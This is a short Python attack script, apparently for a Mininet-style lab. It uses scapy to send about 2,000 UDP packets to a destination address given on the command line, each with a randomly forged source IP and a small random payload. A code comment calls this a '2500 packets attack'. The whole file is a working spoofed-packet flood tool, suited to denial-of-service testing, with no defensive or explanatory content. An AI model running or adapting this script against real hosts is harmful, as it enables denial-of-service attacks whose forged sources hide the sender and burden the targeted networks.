import argparse
import random
import string
from random import randrange
from scapy.all import sendp, IP, UDP, Ether, TCP
import sys
import time
from os import popen
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
parser = argparse.ArgumentParser(description='Nhập interface')
parser.add_argument('-i', '--input', help='Nhập interface -i')
parser.add_argument('-d', '--destination', help='Nhập địa chỉ đích -d')


def payload_generator(size, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


def generateSourceIP():
    not_valid = [10, 127, 254, 255, 1, 2, 169, 172, 192]

    first = randrange(1, 256)

    while first in not_valid:
        first = randrange(1, 256)
        # print first

    ip = ".".join([str(first), str(randrange(1, 256)), str(
        randrange(1, 256)), str(randrange(1, 256))])
    # print ip
    return ip


def main():  # 2500 packets attack
    for i in range(1, 5):
        launchAttack()
        # time.sleep ()


def launchAttack():
    args = parser.parse_args()
    # eg, python3.8 attack.py -i h1 -d 10.0.0.1
    destinationIP = args.destination
    # print destinationIP
    interface = args.input+"-eth0"
    print("interface: ", interface)
    print("destinationIP: ", destinationIP)
    for i in range(0, 500):
        packets = Ether() / IP(dst=destinationIP, src=generateSourceIP()) / \
            UDP(dport=1, sport=80)/payload_generator(size=randrange(1, 5))
        print(repr(packets))
        sendp(packets, iface=interface, inter=0.05)


if __name__ == "__main__":
    main()
